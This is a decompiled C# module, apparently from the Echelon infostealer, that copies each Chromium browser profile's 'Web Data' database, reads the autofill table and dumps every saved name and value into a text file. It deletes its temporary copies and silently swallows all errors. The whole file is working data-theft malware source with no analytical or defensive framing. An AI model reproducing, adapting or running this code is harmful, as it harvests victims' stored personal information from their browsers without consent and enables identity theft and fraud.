using Echelon;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

internal class o
{
	public static int a;

	public static void a(string ap)
	{
		try
		{
			List<string> list = t.a();
			Random random = new Random();
			foreach (string item in list)
			{
				try
				{
					using (StreamWriter streamWriter = new StreamWriter(ap + "\\Autofill_Chromium.txt", append: true, Encoding.Default))
					{
						streamWriter.WriteLine($"Browser - {item}\n\n");
						string text = item + "\\Web Data";
						_ = new FileInfo(text).Length;
						string text2 = Global.AppDate + "\\System_" + random.Next(10000000);
						File.Copy(text, text2, overwrite: true);
						if (item.Contains("Guest Profile") || item.Contains("System Profile"))
						{
							File.Delete(text2);
						}
						else
						{
							x x = new x(text2);
							x.e("autofill");
							if (x.b() != 65536)
							{
								for (int i = 0; i < x.b(); i++)
								{
									string text3 = "";
									try
									{
										string arg = x.a(i, 0);
										text3 = x.a(i, 1);
										streamWriter.Write($"Name : {arg}\t\nValue : {text3}\t\n\n");
										o.a++;
									}
									catch
									{
									}
								}
								streamWriter.WriteLine($"\n\n");
								File.Delete(text2);
							}
						}
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}
}
